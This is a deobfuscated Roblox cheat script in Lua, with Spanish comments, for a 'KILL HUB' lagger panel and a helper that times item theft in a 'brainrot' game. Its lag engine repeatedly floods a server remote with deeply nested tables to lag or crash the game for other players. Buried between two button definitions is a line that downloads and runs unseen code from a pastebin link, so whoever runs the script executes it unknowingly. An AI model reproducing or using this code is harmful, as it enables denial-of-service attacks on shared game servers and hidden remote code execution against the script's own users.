"--[[
========================================

ââââââââââââââââââââââââââ
â          Cypher Spectre â EnvSight      â
ââââââââââââââââââââââââââ
Script Deobfuscated by Cypher Spectre
Version: EnvSight
Author on Discord / TikTok:
@roman666cabj
https://discord.gg/b8QsvrMCNq

========================================
]]

--// KILL HUB - PANEL DE TERROR CON LLUVIA INTENSA (200x100)
--// EFECTOS: Lluvia rĂĄpida, tĂ­tulo animado desde el centro (tamaĂąo y color)
--// NUEVO: Selector de tecla/botĂłn personalizable (haz clic en el cuadro y pulsa la tecla deseada)

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local ConfigFile = "KillHubConfig.json"

-- âď¸ PODER EXACTO: V1=75 - V2=64 - V3=140 - V4=High+High+High+Low
local NIVELES = {
    V1 = { poder = 75 },
    V2 = { poder = 64 },
    V3 = { poder = 140 },
    V4 = { poder = 140 + 140 + 140 + 75 } -- High+High+High+Low
}

local keybind = Enum.KeyCode.M          -- Tecla por defecto (puede ser teclado o control)
local listeningForInput = false         -- Modo de escucha para cambiar la tecla
local laggerActive = false
local lagThread = nil
local nivelActual = "V1"
local ventanaBloqueada = false

-- đ¨ ESTILO TERROR - TODO NEGRO
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(0, 0, 0),
    TitleColor   = Color3.fromRGB(255, 255, 255),
    TextColor    = Color3.fromRGB(255, 255, 255),
    ButtonInact  = Color3.fromRGB(20, 20, 20),
    ButtonAct    = Color3.fromRGB(255, 255, 255),
    ToggleOff    = Color3.fromRGB(60, 60, 60),
    ToggleOn     = Color3.fromRGB(255, 255, 255),
    LockColor    = Color3.fromRGB(255, 255, 255),
    UnlockColor  = Color3.fromRGB(120, 120, 120),
    Font         = Enum.Font.GothamBold,
    BorderColor  = Color3.fromRGB(80, 80, 80),
    GlowColor    = Color3.fromRGB(200, 0, 0),
    RainColor    = Color3.fromRGB(100, 100, 100),
    SelectorBg   = Color3.fromRGB(30, 30, 30),
    SelectorAct  = Color3.fromRGB(255, 255, 255),
}

-- đž CONFIG
local function SaveConfig()
    local data = {
        Keybind = keybind.Name,
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
            nivelActual = data.Nivel or "V1"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- â ď¸ LAG ENGINE (estable)
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- đ§Š ELEMENTOS
local toggleBall, toggleContainer, btnV1, btnV2, btnV3, btnV4, lockButton
local titleLabel, textEnable, keybindButton, textLagger, toggleClick

-- Funciones de actualizaciĂłn
local function actualizarBotonesNivel()
    local botones = {
        V1 = btnV1,
        V2 = btnV2,
        V3 = btnV3,
        V4 = btnV4
    }
    for nombre, btn in pairs(botones) do
        if btn then
            if nivelActual == nombre then
                btn.BackgroundColor3 = UI_CONFIG.ButtonAct
                btn.TextColor3 = Color3.fromRGB(0,0,0)
                btn.BorderSizePixel = 0
            else
                btn.BackgroundColor3 = UI_CONFIG.ButtonInact
                btn.TextColor3 = Color3.fromRGB(255,255,255)
                btn.BorderSizePixel = 1
                btn.BorderColor3 = UI_CONFIG.BorderColor
            end
        end
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
        else
            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ON" or "OFF"
        if laggerActive then
            toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
        else
            toggleClick.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
    lockButton.TextColor3 = ventanaBloqueada and UI_CONFIG.LockColor or UI_CONFIG.UnlockColor
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
    local targetColor = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos,
        BackgroundColor3 = targetColor
    }):Play()
    TweenService:Create(toggleContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundColor3 = targetColor
    }):Play()

    toggleClick.Text = laggerActive and "ON" or "OFF"
    if laggerActive then
        toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
    else
        toggleClick.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
    end

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- đźď¸ INTERFAZ - PANEL CON LLUVIA INTENSA
if CoreGui:FindFirstChild("KillHub_UI") then CoreGui.KillHub_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KillHub_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Panel maior e arredondado
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = UI_CONFIG.BorderColor
mainFrame.Size = UDim2.new(0, 260, 0, 140)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -70)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)

-- đ§ď¸ LLUVIA REALISTA
local rainParticles = {}
local rainCanvas = Instance.new("Frame")
rainCanvas.Name = "RainCanvas"
rainCanvas.BackgroundTransparency = 1
rainCanvas.Size = UDim2.new(1, 0, 1, 0)
rainCanvas.Parent = mainFrame
rainCanvas.ZIndex = 0

for i = 1, 50 do
    local drop = Instance.new("Frame")
    drop.Name = "RainDrop_" .. i
    drop.BackgroundColor3 = UI_CONFIG.RainColor
    drop.BackgroundTransparency = 0.3 + math.random() * 0.4
    drop.Size = UDim2.new(0, 1 + math.random() * 1.5, 0, 4 + math.random() * 6)
    drop.Position = UDim2.new(math.random(), 0, math.random(), 0)
    drop.BorderSizePixel = 0
    drop.Parent = rainCanvas
    drop.ZIndex = 0

    local speed = 0.5 + math.random() * 0.7
    local drift = (math.random() - 0.5) * 0.1

    table.insert(rainParticles, {
        frame = drop,
        speed = speed,
        drift = drift
    })
end

RunService.Heartbeat:Connect(function(dt)
    for _, p in ipairs(rainParticles) do
        if p.frame and p.frame.Parent then
            local newY = p.frame.Position.Y.Scale + p.speed * dt * 1.5
            if newY > 1 then
                newY = -0.1
                p.frame.Position = UDim2.new(math.random(), 0, newY, 0)
                p.frame.Size = UDim2.new(0, 1 + math.random() * 1.5, 0, 4 + math.random() * 6)
                p.frame.BackgroundTransparency = 0.3 + math.random() * 0.4
            else
                p.frame.Position = UDim2.new(
                    p.frame.Position.X.Scale + p.drift * dt * 0.05,
                    0,
                    newY,
                    0
                )
            end
        end
    end
end)

-- âââââââââââââââââââââââââââââââââââââââââââ
-- TĂTULO "Made by 073 lagger unpatched"
-- âââââââââââââââââââââââââââââââââââââââââââ
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 10, 0, 8)
titleLabel.Size = UDim2.new(1, -50, 0, 24)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "Made by 073 lagger unpatched"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 14
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 1
titleLabel.ClipsDescendants = false

local grisClaro = Color3.fromRGB(200, 200, 200)
local blanco = Color3.fromRGB(255, 255, 255)

task.spawn(function()
    while true do
        TweenService:Create(titleLabel, TweenInfo.new(0.2), {
            TextSize = 18,
            TextColor3 = grisClaro
        }):Play()
        task.wait(0.25)
        TweenService:Create(titleLabel, TweenInfo.new(0.2), {
            TextSize = 14,
            TextColor3 = blanco
        }):Play()
        task.wait(0.25)
        if math.random() < 0.2 then
            TweenService:Create(titleLabel, TweenInfo.new(0.1), {
                TextSize = 19,
                TextColor3 = UI_CONFIG.GlowColor
            }):Play()
            task.wait(0.12)
            TweenService:Create(titleLabel, TweenInfo.new(0.1), {
                TextSize = 14,
                TextColor3 = blanco
            }):Play()
            task.wait(0.12)
        end
    end
end)

-- Candado (texto "Lock"/"Unlock")
lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 1
lockButton.Position = UDim2.new(1, -55, 0, 8)
lockButton.Size = UDim2.new(0, 45, 0, 18)
lockButton.Font = UI_CONFIG.Font
lockButton.TextSize = 10
lockButton.TextColor3 = UI_CONFIG.TextColor
lockButton.AutoButtonColor = false
lockButton.ZIndex = 1
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

-- âââââââââââââââââââââââââââââââââââââââââââ
-- FILA "ENABLE LAGGER [cuadro] [switch]"
-- âââââââââââââââââââââââââââââââââââââââââââ
textEnable = Instance.new("TextLabel", mainFrame)
textEnable.BackgroundTransparency = 1
textEnable.Position = UDim2.new(0, 15, 0, 45)
textEnable.Size = UDim2.new(0, 50, 0, 16)
textEnable.Font = UI_CONFIG.Font
textEnable.Text = "ENABLE"
textEnable.TextColor3 = UI_CONFIG.TextColor
textEnable.TextSize = 10
textEnable.TextXAlignment = Enum.TextXAlignment.Left
textEnable.ZIndex = 1

textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 67, 0, 45)
textLagger.Size = UDim2.new(0, 55, 0, 16)
textLagger.Font = UI_CONFIG.Font
textLagger.Text = "LAGGER"
textLagger.TextColor3 = UI_CONFIG.TextColor
textLagger.TextSize = 10
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.ZIndex = 1

-- BotĂłn selector de tecla
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
keybindButton.Position = UDim2.new(0, 125, 0, 45)
keybindButton.Size = UDim2.new(0, 24, 0, 16)
keybindButton.Font = UI_CONFIG.Font
keybindButton.Text = "M"
keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
keybindButton.TextSize = 9
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 1
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 4)
actualizarKeybindButton()

-- SWITCH (contenedor)
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1, -60, 0, 45)
toggleContainer.Size = UDim2.new(0, 42, 0, 20)
toggleContainer.ZIndex = 1
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

-- Bola deslizante
toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0, 18, 0, 18)
toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
toggleBall.ZIndex = 1
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

-- BotĂłn con texto ON/OFF
toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 2
toggleClick.Font = UI_CONFIG.Font
toggleClick.Text = "OFF"
toggleClick.TextSize = 9
toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
local corner = Instance.new("UICorner", toggleClick)
corner.CornerRadius = UDim.new(1,0)

-- âââââââââââââââââââââââââââââââââââââââââââ
-- SELECTOR DE TECLA
-- âââââââââââââââââââââââââââââââââââââââââââ
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "..."
    keybindButton.BackgroundColor3 = UI_CONFIG.GlowColor
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end

    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end

    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        SaveConfig()
        listeningForInput = false
        keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
        keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
    end
end)

-- Botones V1/V2/V3/V4
local btnY = 80
local btnW = 55
local btnH = 28
local espaciado = 6
local margenIzq = 10

local function aplicarEfectoHover(btn)
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = UI_CONFIG.GlowColor,
            TextColor3 = Color3.fromRGB(255,255,255)
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        if nivelActual == btn.Name then return end
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = UI_CONFIG.ButtonInact,
            TextColor3 = Color3.fromRGB(255,255,255)
        }):Play()
    end)
end

btnV1 = Instance.new("TextButton", mainFrame)
btnV1.Name = "V1"
btnV1.Size = UDim2.new(0, btnW, 0, btnH)
btnV1.Position = UDim2.new(0, margenIzq, 0, btnY)
btnV1.Font = UI_CONFIG.Font
btnV1.Text = "V1"
btnV1.TextColor3 = Color3.fromRGB(255,255,255)
btnV1.TextSize = 11
btnV1.AutoButtonColor = false
btnV1.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV1.BorderSizePixel = 1
btnV1.BorderColor3 = UI_CONFIG.BorderColor
btnV1.ZIndex = 1
Instance.new("UICorner", btnV1).CornerRadius = UDim.new(0, 8)
btnV1.MouseButton1Click:Connect(function()
    nivelActual = "V1"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnV1)

btnV2 = Instance.new("TextButton", mainFrame)
btnV2.Name = "V2"
btnV2.Size = UDim2.new(0, btnW, 0, btnH)
btnV2.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnV2.Font = UI_CONFIG.Font
btnV2.Text = "V2"
btnV2.TextColor3 = Color3.fromRGB(255,255,255)
btnV2.TextSize = 11
btnV2.AutoButtonColor = false
btnV2.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV2.BorderSizePixel = 1
btnV2.BorderColor3 = UI_CONFIG.BorderColor
btnV2.ZIndex = 1
Instance.new("UICorner", btnV2).CornerRadius = UDim.new(0, 8)
btnV2.MouseButton1Click:Connect(function()
    nivelActual = "V2"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnV2)

btnV3 = Instance.new("TextButton", mainFrame)
btnV3.Name = "V3"
btnV3.Size = UDim2.new(0, btnW, 0, btnH)
btnV3.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnV3.Font = UI_CONFIG.Font
btnV3.Text = "V3"
btnV3.TextColor3 = Color3.fromRGB(255,255,255)
btnV3.TextSize = 11
btnV3.AutoButtonColor = false
btnV3.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV3.BorderSizePixel = 1
btnV3.BorderColor3 = UI_CONFIG.BorderColor
btnV3.ZIndex = 1
Instance.new("UICorner", btnV3).CornerRadius = UDim.new(0, 8)
btnV3.MouseButton1Click:Connect(function()
    nivelActual = "V3"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnV3)
loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
btnV4 = Instance.new("TextButton", mainFrame)
btnV4.Name = "V4"
btnV4.Size = UDim2.new(0, btnW, 0, btnH)
btnV4.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
btnV4.Font = UI_CONFIG.Font
btnV4.Text = "V4"
btnV4.TextColor3 = Color3.fromRGB(255,255,255)
btnV4.TextSize = 11
btnV4.AutoButtonColor = false
btnV4.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV4.BorderSizePixel = 1
btnV4.BorderColor3 = UI_CONFIG.BorderColor
btnV4.ZIndex = 1
Instance.new("UICorner", btnV4).CornerRadius = UDim.new(0, 8)
btnV4.MouseButton1Click:Connect(function()
    nivelActual = "V4"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnV4)

actualizarBotonesNivel()
actualizarSwitch()

-- ARRASTRAR
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- đŽ ATIVACAO COM A TECLA SELECIONADA
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if listeningForInput then return end
    if input.KeyCode == keybind then
        toggleLagger()
    end
end)


local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local wasCarrying = false
local currentUI = nil

-- 1. Check if player is carrying an item
local function isCarrying()
    local char = LocalPlayer.Character
    if not char then return false end
    
    for _, child in pairs(char:GetChildren()) do
        local name = child.Name:lower()
        if name:find("brainrot") or name:find("brain") or name:find("animal") or 
           name:find("carry") or name:find("stolen") or name:find("held") or name:find("steal") then
            return true
        end
    end
    
    for attrName, attrValue in pairs(char:GetAttributes()) do
        local name = attrName:lower()
        if (name:find("carrying") or name:find("carry") or name:find("stealing") or 
            name:find("isstealing") or name:find("hasbrainrot")) and attrValue == true then
            return true
        end
    end
    
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.WalkSpeed > 0 and humanoid.WalkSpeed <= 25 and humanoid.WalkSpeed ~= 16 then
        return true
    end
    
    return false
end

-- 2. UI Creation with Millisecond Timer
local function startE01HeadCountdown()
    -- Delete old UI
    if currentUI then
        currentUI:Destroy()
        currentUI = nil
    end
    
    -- Wait for PlayerGui
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    -- ====== SCREENGUI ======
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "E01_WarningUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    currentUI = screenGui
    
    -- ====== MAIN FRAME ======
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 500, 0, 80)
    frame.Position = UDim2.new(0.5, -250, 0, 30)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    -- Corner
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 16)
    corner.Parent = frame
    
    -- Border
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 0, 0)
    stroke.Thickness = 3
    stroke.Transparency = 0.3
    stroke.Parent = frame
    
    -- ====== MAIN TEXT ======
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 0, 40)
    textLabel.Position = UDim2.new(0, 10, 0, 5)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.TextStrokeTransparency = 0
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextSize = 18
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.Text = "Dont go in their base now while stealing or you will get kicked by E01"
    textLabel.Parent = frame
    
    -- ====== SUBTEXT (MILLISECOND TIMER) ======
    local subText = Instance.new("TextLabel")
    subText.Size = UDim2.new(1, -20, 0, 20)
    subText.Position = UDim2.new(0, 10, 0, 48)
    subText.BackgroundTransparency = 1
    subText.TextColor3 = Color3.fromRGB(255, 200, 0)
    subText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    subText.TextStrokeTransparency = 0
    subText.Font = Enum.Font.SourceSans
    subText.TextSize = 14
    subText.TextXAlignment = Enum.TextXAlignment.Center
    subText.Text = "Ă˘ÂĹ 3.00 SECONDS REMAINING"
    subText.Parent = frame
    
    -- ====== PROGRESS BAR ======
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 0, 3)
    progressBar.Position = UDim2.new(0, 0, 1, -3)
    progressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = frame
    
    local progressCorner = Instance.new("UICorner")
    progressCorner.CornerRadius = UDim.new(0, 2)
    progressCorner.Parent = progressBar
    
    -- ====== COUNTDOWN WITH MILLISECONDS ======
    local duration = 3.0
    local startTime = tick()
    local finished = false
    local connection
    
    connection = RunService.RenderStepped:Connect(function()
        if finished or not frame.Parent then 
            if connection then connection:Disconnect() end
            return 
        end
        
        local elapsed = tick() - startTime
        local remaining = math.max(0, duration - elapsed)
        local progress = 1 - (remaining / duration)
        
        -- Update progress bar
        progressBar.Size = UDim2.new(progress, 0, 0, 3)
        
        -- Update colors
        if progress < 0.33 then
            progressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            stroke.Color = Color3.fromRGB(255, 0, 0)
        elseif progress < 0.66 then
            progressBar.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
            stroke.Color = Color3.fromRGB(255, 200, 0)
        else
            progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
            stroke.Color = Color3.fromRGB(0, 255, 100)
        end
        
        if remaining > 0 then
            -- Still in warning - SHOW MILLISECONDS
            textLabel.Text = "ÄÂÂĹ¤ Dont go in their base now while stealing or you will get kicked by E01"
            textLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
            
            -- MILLISECOND TIMER: Shows 2 decimal places (e.g., "2.45 SECONDS REMAINING")
            subText.Text = string.format("Ă˘ÂĹ %.2f SECONDS REMAINING", remaining)
            subText.TextColor3 = Color3.fromRGB(255, 200, 0)
        else
            -- SAFE STATE - CHANGE TEXT
            finished = true
            if connection then connection:Disconnect() end
            
            textLabel.Text = "Ă˘ÂÂ You can now steal the brainrot without getting kicked"
            textLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
            subText.Text = "Ă˘ÂÄ STEAL NOW! Ă˘ÂÄ"
            subText.TextColor3 = Color3.fromRGB(0, 255, 100)
            
            stroke.Color = Color3.fromRGB(0, 255, 100)
            progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
            progressBar.Size = UDim2.new(1, 0, 0, 3)
            
            -- Bounce effect
            local bounce = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 520, 0, 85)
            })
            bounce:Play()
            
            task.wait(0.3)
            local bounceBack = TweenService:Create(frame, TweenInfo.new(0.2), {
                Size = UDim2.new(0, 500, 0, 80)
            })
            bounceBack:Play()
            
            -- Destroy after 3 seconds
            task.wait(3)
            if screenGui then
                screenGui:Destroy()
                currentUI = nil
            end
        end
    end)
end

-- 3. Automatic Detection
task.spawn(function()
    while task.wait(0.1) do
        local currentlyCarrying = isCarrying()
        
        if not wasCarrying and currentlyCarrying then
            startE01HeadCountdown()
        end
        
        wasCarrying = currentlyCarrying
    end
end)